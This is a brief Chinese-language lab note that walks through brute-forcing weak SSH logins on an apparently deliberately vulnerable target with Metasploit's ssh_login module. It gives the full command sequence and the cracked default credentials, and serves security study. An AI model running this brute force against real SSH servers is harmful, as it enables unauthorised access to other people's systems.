# 22_ssh

弱口令爆破

使用msf

搜索模块脚本

> search ssh_login

![image-20210319095256781](../../image/meteaspolitale2/image-20210319095256781.png)

选择模块脚本

> use auxiliary/scanner/ssh/ssh_login

查看选项

> options

![image-20210319095419787](../../image/meteaspolitale2/image-20210319095419787.png)

选择目标靶机

> set RHOSTS

设置用户名字典

> set USER_FILE username1.txt

设置密码字典

> set PASS_FILE password.txt

设置线程

> set THREADS 50

设置是否回显

> set VERBOSE true

执行

> exploit

![image-20210319104559365](../../image/meteaspolitale2/image-20210319104559365.png)

获得爆破用户名密码

```
msfadmin/msfadmin
user/user
postgres/postgres
sys/batman
klog/123456789
service/service
```

